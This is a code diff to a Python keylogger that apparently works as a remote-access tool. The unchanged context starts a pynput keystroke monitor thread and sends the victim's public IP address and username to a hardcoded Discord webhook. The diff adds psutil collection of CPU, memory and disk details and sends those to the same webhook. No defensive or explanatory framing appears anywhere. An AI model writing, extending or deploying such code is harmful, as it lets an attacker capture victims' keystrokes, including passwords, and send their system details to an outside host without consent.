@@ -5,6 +5,13 @@ import subprocess
 import time
 from pynput import keyboard
 
+import psutil
+
+cpu_count = psutil.cpu_count(logical=True)
+cpu_percent = psutil.cpu_percent(interval=1)
+memory_info = psutil.virtual_memory()
+disk_info = psutil.disk_usage('/')
+
 # Discord webhook URL (replace with your own webhook URL)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
 
@@ -104,6 +111,11 @@ username = os.getlogin()
 public_ip = get_public_ip()
 send_to_webhook(f"Connection established. Public IP address: {public_ip}")
 send_to_webhook(f"Current user: {username}")
+
+send_to_webhook(f"CPU cores: {cpu_count}")
+send_to_webhook(f"CPU percent: {cpu_percent}%")
+send_to_webhook(f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
+send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
 
 # Start the keystroke monitor thread
 threading.Thread(target=keystroke_monitor, daemon=True).start()
